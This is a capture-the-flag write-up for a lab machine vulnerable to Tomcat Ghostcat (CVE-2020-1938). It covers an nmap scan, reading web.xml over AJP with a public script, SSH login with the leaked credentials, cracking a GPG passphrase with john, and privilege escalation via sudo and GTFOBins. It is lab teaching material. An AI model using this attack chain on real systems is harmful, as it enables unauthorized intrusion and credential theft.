# CVE-2020-1938


## Enumeration 

# Nmap Scan

```
nmap -sV -sC -vv -T5 -p- -oA result 10.10.24.24
```

The Results!

```java
PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=
|   256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw
53/tcp   open  tcpwrapped syn-ack
8009/tcp open  ajp13      syn-ack Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       syn-ack Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Checking the webpage!

![****](/tomghost/Screenshots/apache.PNG)

A quick search on Google! it turned out that this version of Apache is Vulnerable to File/code Execution!

![****](/tomghost/Screenshots/exploit-db.PNG)


About the Vulnerability!

- The general idea of a Tomcat server has different ports set up . There’s of course the 8080 HTTP webservice port. Then there is another lesser known port 8009 which runs the AJP (Apache JServ Protocol) service. It is essentially a service implemented through tomcat and allows for performing different operations.
- AJP is a binary protocol that reduces overhead for an application server in comparison to the HTTP. It is similar to HTTP but at a binary level. Since it is binary , the machine level translation is far more faster than the HTTP parsing.
- Apache Tomcat versions 6.x, 7.x, 8.x, and 9.x are found to be vulnerable to this Ghostcat issue.

Reference: https://apkash8.medium.com/hunting-and-exploiting-apache-ghostcat-b7446ef83e74

After few searchs! I found this script made by 000theway, [Ghostcat-CNVD-2020-10487
](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

The command I used to check the files! 

![****](/tomghost/Screenshots/ajp.PNG)

```
python3 ajpShooter.py http://10.10.24.24:8080/ 8009 /WEB-INF/web.xml read
```

Wanted to read ```web.xml``` file! surprisingly I saw some credentials there! 

![****](/tomghost/Screenshots/skyfuck.PNG)

## It's time for SSH!

### user.txt

![****](/tomghost/Screenshots/user.PNG)

In our main home directory we recognized 2 files! gpg and asc!
- GNU Privacy Guard is a free-software replacement for Symantec's PGP cryptographic software suite, Allows you to securely encrypt files so that only the intended recipient can decrypt them.
- .asc file is an ASCII-armored representation of key material (or a signature), asc seemed to be the key to decrypt the ```.gpg``` file


Few search on google! how to decrypt using ```.asc``` files:

```
gpg --import tryhackme.asc
```

```
gpg --decrypt credential.pgp
```


![****](/tomghost/Screenshots/asc.PNG)

It seems we need a passphase! how to solve this? let get the asc file on our machine! and try to brute force it using ```gpg2john``` tool to generate the hash so ```john``` can brute force it!

```
gpg2john tryhackme.asc > hash
```

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![****](/tomghost/Screenshots/gpg2john.PNG)


![****](/tomghost/Screenshots/john.PNG)

Now let try to decrypt!

![****](/tomghost/Screenshots/decrypt.PNG)

We got some Credentials again!

```su merlin```

## root.txt

``` sudo -l```

![****](/tomghost/Screenshots/merlin.PNG)

A quick search on GTFOBins

![****](/tomghost/Screenshots/gtfo.PNG)


![****](/tomghost/Screenshots/root.PNG)


# We're ROOT!